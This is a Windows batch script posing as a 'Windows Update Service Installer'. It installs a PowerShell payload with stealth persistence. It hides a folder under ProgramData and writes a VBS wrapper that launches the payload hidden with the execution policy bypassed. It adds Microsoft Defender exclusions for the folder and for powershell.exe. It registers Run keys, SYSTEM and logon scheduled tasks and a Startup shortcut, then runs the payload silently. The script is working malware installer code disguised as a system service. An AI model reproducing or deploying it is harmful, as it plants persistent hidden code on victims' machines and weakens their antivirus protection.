@echo off
title Windows Update Service Installer
echo [*] Installing Windows Update Service...

:: Set paths – payload is now in parent's "payload" folder
set "PAYLOAD_SRC=%~dp0..\payload\payload.ps1"
set "PAYLOAD_DIR=%ProgramData%\Microsoft\Windows\Update"
set "PAYLOAD_FILE=%PAYLOAD_DIR%\WindowsUpdateService.ps1"
set "WRAPPER_FILE=%PAYLOAD_DIR%\launcher.vbs"

:: Create directory
if not exist "%PAYLOAD_DIR%" mkdir "%PAYLOAD_DIR%"
attrib +h "%PAYLOAD_DIR%"

:: Copy payload
copy /Y "%PAYLOAD_SRC%" "%PAYLOAD_FILE%"

:: Create VBS wrapper (silent launcher)
(
echo Set objShell = CreateObject("WScript.Shell"^)
echo objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%PAYLOAD_FILE%""", 0, False
echo Set objShell = Nothing
) > "%WRAPPER_FILE%"

:: Add Defender exclusions
powershell -command "Add-MpPreference -ExclusionPath '%PAYLOAD_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue"

:: Registry Run (User + Machine) – using VBS wrapper
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "wscript.exe \"%WRAPPER_FILE%\"" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "wscript.exe \"%WRAPPER_FILE%\"" /f

:: Scheduled Tasks (startup + logon) – using VBS wrapper
schtasks /create /tn "WindowsUpdateService" /tr "wscript.exe \"%WRAPPER_FILE%\"" /sc onstart /ru SYSTEM /rl HIGHEST /f
schtasks /create /tn "WindowsUpdateService_User" /tr "wscript.exe \"%WRAPPER_FILE%\"" /sc onlogon /ru %USERNAME% /f

:: Startup Folder shortcut – using VBS wrapper
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "LNK=%STARTUP%\WindowsUpdateService.lnk"
powershell -command "$W=New-Object -ComObject WScript.Shell; $S=$W.CreateShortcut('%LNK%'); $S.TargetPath='wscript.exe'; $S.Arguments='\"%WRAPPER_FILE%\"'; $S.WindowStyle=7; $S.Save()"

:: Run the payload now (silent)
wscript.exe "%WRAPPER_FILE%"

echo [*] Installation complete. Service will start automatically on next reboot.
pause